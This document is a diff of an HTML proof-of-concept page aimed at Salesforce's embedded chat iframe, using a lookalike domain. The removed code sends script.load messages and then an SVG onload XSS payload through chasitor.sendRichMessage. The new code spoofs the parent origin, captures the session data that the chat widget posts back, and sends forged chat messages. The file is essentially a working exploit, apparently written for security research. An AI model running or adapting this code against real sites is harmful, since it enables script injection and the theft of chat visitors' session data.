@@ -1,52 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Salesforce XSS PoC</title>
-  <style>
-    iframe {
-      width: 100%;
-      height: 600px;
-      border: 1px solid #ccc;
-    }
-  </style>
+  <title>Salesforce iframe Metadata Console Test</title>
 </head>
 <body>
-  <h2>Salesforce iframe XSS PoC</h2>
+  <h2>Console Test: Salesforce iframe Metadata</h2>
 
-  <iframe id="eswFrame" src="https://reddit.com.wangdubruh.xyz" onload="runXSS()" allow="camera *; microphone *;"></iframe>
+  <iframe id="eswFrame"
+          src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
+          allow="camera *; microphone *;"
+          style="width:100%;height:400px;"></iframe>
 
   <script>
-    function runXSS() {
-      const frame = document.getElementById("eswFrame");
-      const origin = "*"; // safer: restrict if you know exact domain
+    const frame = document.getElementById("eswFrame");
 
-      // Optional: attempt script.load if required (not mandatory for XSS in sendRichMessage)
-      const features = ["chasitor", "filetransfer"];
-      for (const feature of features) {
-        frame.contentWindow.postMessage({
-          method: "script.load",
-          feature: feature
-        }, origin);
-        console.log(`📤 Sent script.load for feature: '${feature}'`);
+    window.addEventListener("message", (e) => {
+      console.log("📩 Message from iframe:", e.data);
+
+      if (typeof e.data === "object" && e.data.method &&
+          (e.data.method === "liveagent.initialized" || e.data.method === "liveagent.restored")) {
+        console.log("✅ Captured session data from chasitor:");
+        console.log(JSON.stringify(e.data.data, null, 2));
       }
+    });
 
-      // Wait a bit for scripts to load before attempting XSS
+    frame.onload = () => {
+      console.log("[+] Iframe loaded (Salesforce 4.0)");
+
+      ["chasitor", "filetransfer"].forEach((feature) => {
+        const msg = { method: "script.load", feature };
+        console.log("📤 Sending script.load for feature:", feature);
+        frame.contentWindow.postMessage(msg, "*");
+      });
+
       setTimeout(() => {
-        const payload = `"><svg/onload=alert('XSS')>`;
-
-        const message = {
-          method: "chasitor.sendRichMessage",
-          domain: "reddit.com.wangdubruh.xyz", // replace with actual target domain if needed
-          data: {
-            type: "text",
-            text: payload
-          }
+        const msg = {
+          method: "chasitor.sendMessage",
+          domain: "reddit.com.wangdubruh.xyz",
+          data: "hello from PoC"
         };
-
-        console.log("📤 Sending XSS payload via chasitor.sendRichMessage", message);
-        frame.contentWindow.postMessage(message, origin);
-      }, 1000);
-    }
+        console.log("📤 Sending fake message to chasitor");
+        frame.contentWindow.postMessage(msg, "*");
+      }, 3000);
+    };
   </script>
 </body>
 </html>
